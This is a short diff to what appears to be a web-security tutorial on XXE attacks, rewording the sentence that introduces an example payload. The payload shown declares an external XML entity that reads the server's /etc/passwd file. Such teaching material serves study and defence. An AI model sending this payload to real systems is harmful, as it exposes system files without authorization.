@@ -45,8 +45,7 @@ Example: Application checks for the stock level of a product by submitting the f
 <stocCheck><productId>381</productId></stockCheck>
 ```
 
-The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload: 
-
+Here no defenses against XXE attacks, so you can exploit XXE to retrieve the `/etc/passwd` file by submitting following XXE payload: 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
